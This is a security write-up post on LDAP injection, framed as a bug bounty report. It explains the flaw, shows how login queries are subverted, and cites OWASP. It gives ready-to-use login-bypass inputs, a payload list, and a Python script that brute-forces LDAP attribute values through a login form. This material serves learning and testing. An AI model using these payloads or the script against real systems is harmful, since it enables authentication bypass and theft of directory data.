---
title: LDAP Injection
url: https://infosecwriteups.com/ldap-injection-653d7225dd8?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-05-03
fetch_date: 2025-10-04T11:38:59.638002
---

# LDAP Injection

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F653d7225dd8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fldap-injection-653d7225dd8&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fldap-injection-653d7225dd8&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-653d7225dd8---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-653d7225dd8---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# LDAP Injection

## A Critical Security Flaw Exposing the Application to LDAP Injection Attacks

[![Aswin KV](https://miro.medium.com/v2/resize:fill:64:64/1*FRePVrXU-ZBSpzBlr5sBvg.jpeg)](https://45w1nkv.medium.com/?source=post_page---byline--653d7225dd8---------------------------------------)

[Aswin KV](https://45w1nkv.medium.com/?source=post_page---byline--653d7225dd8---------------------------------------)

3 min read

·

May 2, 2023

--

1

Listen

Share

![]()

Designed by Author

**Summary:**

*This vulnerability has the potential to cause data leaking, unauthorised access, and other major security problems. To safeguard user data and system integrity, we firmly advise that this problem be given prompt attention and resolution.*

**Vulnerability Details:**

*LDAP (Lightweight Directory Access Protocol) injection is a code injection technique that occurs when untrusted user input is directly included in an LDAP query without proper sanitization or validation.*

*The target application failed to adequately validate user-supplied input, leading to a potential LDAP injection vulnerability.*

*An attacker can use this weakness to alter LDAP queries, evade authentication checks, obtain unauthorised access to confidential data, or carry out harmful deeds.*

**Affected Component:**

*The LDAP injection vulnerability affects the authentication module of the web application, specifically the code responsible for processing user credentials and authenticating against an LDAP server.*

**Steps to Reproduce:**

1. Identify a field within the application that interacts with LDAP queries.
2. Craft a malicious input containing LDAP metacharacters, such as parentheses, asterisks, or backslashes.
3. Submit the input and observe the response from the application.
4. Note any unexpected behavior, error messages, or unusual data retrieval.

**Proof of Concept:**

1. The application allows a user to log in using their username and password.
2. The application constructs an LDAP query using the provided username without proper input validation.
3. An attacker provides the following input in the username field: “)(cn=))(|(uid=))(|(objectClass=\*”
4. The resulting LDAP query becomes: “(&(cn=))(|(uid=))(|(objectClass=\*))(userpassword=[provided password])”
5. The attacker gains unauthorized access and potentially retrieves sensitive information or performs other malicious actions.

**Login Bypass:**

```
user=*
password=*
--> (&(user=*)(password=*))
```

```
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
```

```
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```

**Discover valid LDAP fields**

*LDAP objects provide various properties by default that can be used to preserve data. You can attempt brute-forcing all of them to get that information. There is a list of* [*default LDAP attributes here.*](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)

```
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            #sleep(0.5) #Avoid brute-force bans
            if "Cannot login" in r.text:
                value += str(char)
                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()
```

**Payloads:**

```
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

**Reference:**

[## LDAP Injection

### LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input…

owasp.org](https://owasp.org/www-community/attacks/LDAP_Injection?source=post_page-----653d7225dd8---------------------------------------)

[## PayloadsAllTheThings/LDAP Injection at master · swisskyrepo/PayloadsAllTheThings

### LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input…

github.com](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection?source=post_page-----653d7225dd8---------------------------------------)

**Impact:**

> An attacker can use this flaw to change the format of an LDAP query and issue any LDAP commands they like.
>
> The consequences might include unauthorised access to private data, data manipulation, or even remote code execution, depending on the rights attached to the LDAP service account.
>
> The security and privacy of the target application might be seriously jeopardised if this vulnerability were to be effectively exploited.

[**AI-Powered Cyber Threat Detection and Response**](https://links.swapstack.co/wk5y)**:** SIEM and Compliance solution po...